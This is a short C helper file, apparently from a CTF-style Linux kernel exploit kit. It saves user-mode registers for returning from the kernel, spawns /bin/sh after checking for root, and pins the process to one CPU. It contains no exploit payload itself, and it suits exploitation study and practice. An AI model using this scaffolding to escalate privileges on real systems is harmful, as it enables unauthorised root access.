// author: @eastXueLian
#include "libLian.h"


size_t user_cs, user_ss, user_rflags, user_sp;
void save_status() {
  __asm__("mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;");
  info("Status has been saved.");
}

void get_shell(void) {
  info("Trying to get root shell.");
  if (getuid()) {
    errExit("Failed to get root shell.");
  }
  success("Successfully get root shell.");
  system("/bin/sh");
}

/* to run the exp on the specific core only */
void bind_cpu(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
    success("cpu bind");
}
